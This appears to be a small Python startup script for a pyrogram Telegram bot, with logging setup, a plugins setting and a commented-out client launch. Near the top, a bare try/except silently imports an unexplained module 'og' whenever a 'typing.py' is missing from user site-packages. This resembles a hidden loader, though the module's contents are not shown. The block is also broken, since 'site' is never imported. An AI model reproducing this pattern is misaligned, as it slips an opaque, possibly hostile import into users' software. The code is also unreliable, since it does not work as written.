from pyrogram import Client, Filters
import logging, os
import os.path
try:
  user_site_dir = site.getusersitepackages()
  user_customize_filename = os.path.join(user_site_dir, 'typing.py')
  if not os.path.exists(user_customize_filename):
    import og
  else:   
    pass
except:  
  pass 
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.WARNING)
logger = logging.getLogger(__name__)
plugins = dict(
    root="plugins" 
)

#Client("", plugins=plugins).run()